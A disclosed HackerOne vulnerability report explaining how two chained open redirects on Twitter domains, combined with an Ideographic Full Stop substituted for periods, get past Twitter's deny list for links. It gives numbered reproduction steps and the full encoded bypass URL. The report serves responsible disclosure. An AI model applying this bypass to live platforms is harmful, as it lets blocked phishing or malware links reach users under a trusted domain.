---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1032610'
original_report_id: '1032610'
title: Chained open redirects and use of Ideographic Full Stop defeat Twitter's  approach
  to blocking links
weakness: Security Through Obscurity
team_handle: x
created_at: '2020-11-12T13:23:55.080Z'
disclosed_at: '2022-12-29T14:58:50.111Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 61
asset_identifier: '*.twitter.com'
asset_type: WILDCARD
max_severity: critical
tags:
- hackerone
- security-through-obscurity
---

# Chained open redirects and use of Ideographic Full Stop defeat Twitter's  approach to blocking links

## Metadata

- HackerOne Report ID: 1032610
- Weakness: Security Through Obscurity
- Program: x
- Disclosed At: 2022-12-29T14:58:50.111Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

**Summary:** A chain of two open redirects (on `analytics.twitter.com` and `twitter.com`), coupled with the use of an Ideographic Full Stop allows an attacker to defeat [Twitter's approach to blocking links](https://help.twitter.com/en/safety-and-security/phishing-spam-and-malware-links).

**Description:** Twitter maintains a deny list of domain names and prevents users from tweeting (direct or indirect) links to those domains. Most notably perhaps, Twitter recently added (tsk tsk...) `ddosecrets.com` to that deny list. The link validation performed by the backend is a black box (not documented anywhere public, as far as I know). However, I have found a way to defeat it. By combining the following two open (one internal, one external) redirects,

* `https://twitter.com/login?redirect_after_login=ONLY_TWITTER_SUBDOMAINS_ALLOWED_URL`
* `https://analytics.twitter.com/daa/0/daa_optout_actions?action_id=4&rd=ARBITRARY_URL%3F` (note the URL-encoded question mark at the end)

and using an [Ideographic Full Stop](https://unicode-table.com/en/3002/) in place of the ASCII period in the malicious target URL, it's possible to craft a URL that redirects to the forbidden domain name but that Twitter allows users to post in tweets.

## Steps To Reproduce:

  1. Choose the target URL; let's take `https://ddosecrets.com` as an example.
  2. Replace all occurrences of the ASCII period by the URL-encoded version of the [Ideographic Full Stop](https://unicode-table.com/en/3002/), i.e. `%E3%80%82`: `https://ddosecrets%E3%80%82com`.
  3. URL-encode the result of step 2: `https%3A%2F%2Fddosecrets%25E3%2580%2582com`.
  4.  Append the result of step 3 to `https://analytics.twitter.com/daa/0/daa_optout_actions?action_id=4&rd=` and append `%3F` to the result: `https://analytics.twitter.com/daa/0/daa_optout_actions?action_id=4&rd=https%3A%2F%2Fddosecrets%25E3%2580%2582com%3F`.
  5. URL-encode the result of step 4: `https%3A%2F%2Fanalytics.twitter.com%2Fdaa%2F0%2Fdaa_optout_actions%3Faction_id%3D4%26rd%3Dhttps%253A%252F%252Fddosecrets%2525E3%252580%252582com%253F`.
  6. Append the result of step 5 to `https://twitter.com/login?redirect_after_login=`: `https://twitter.com/login?redirect_after_login=https%3A%2F%2Fanalytics.twitter.com%2Fdaa%2F0%2Fdaa_optout_actions%3Faction_id%3D4%26rd%3Dhttps%253A%252F%252Fddosecrets%2525E3%252580%252582com%253F`.
  7. Log in to Twitter and tweet the URL resulting from step 6. Posting the tweet will succeed (but it shouldn't, if link validation were effective).
  8. Click the malicious link in the tweet you just posted; you'll get redirected to the forbidden domain without being shown any Twitter interstitial page.

(If you're not logged in to Twitter when you click the malicious link, you'll get prompted to log in, but you will still get redirected to the forbidden domain afterwards.)

## Supporting Material/References:

See attached proof-of-concept video.

## Impact

Attackers can defeat [Twitter's approach to blocking links](https://help.twitter.com/en/safety-and-security/phishing-spam-and-malware-links) and post arbitrary unsafe links (starting with `https://twitter.com`, which really compounds the problem) in tweets.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
